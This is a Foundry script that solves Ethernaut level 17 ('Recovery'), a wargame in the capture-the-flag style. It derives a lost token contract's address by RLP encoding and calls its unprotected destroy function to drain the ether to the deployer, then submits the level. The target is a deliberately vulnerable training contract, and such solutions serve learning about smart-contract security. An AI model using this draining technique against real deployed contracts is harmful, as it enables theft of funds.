// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {Recovery, SimpleToken} from "src/17/Recovery.sol";
import {RecoveryFactory} from "src/17/RecoveryFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {HelperConfig} from "../HelperConfig.s.sol";

contract RecoveryExploit is Script {
    address public levelFactory;
    HelperConfig public config;

    function run() external {
        if (block.chainid == 11155111) {
            levelFactory = vm.envAddress("LEVEL17_SEPOLIA_ADDRESS");
        } else {
            levelFactory = address(new RecoveryFactory());
        }
        // Deploy a new instance using the level Address
        config = new HelperConfig{value: 0.001 ether}(levelFactory);//0.001 ether required 
        (address ethernaut, address payable instance, uint256 deployerKey) = config.activeNetworkConfig();

        vm.startBroadcast(deployerKey);

        // Break the contract
        // Get the address of the deployed contract using the rlp encoding rule
        bytes memory rlp_encode = abi.encodePacked(uint8(0xd6), uint8(0x94), instance, uint8(0x01));
        address payable simpleTokenInstance = payable(address(uint160(uint256(keccak256(rlp_encode)))));

        SimpleToken(simpleTokenInstance).destroy(payable(vm.addr(deployerKey)));

        // Submit results
        Ethernaut(ethernaut).submitLevelInstance(instance);
        (,, bool completed) = Ethernaut(ethernaut).emittedInstances(instance);
        require(completed == true, "Solution is not solving the level");

        vm.stopBroadcast();
    }
}
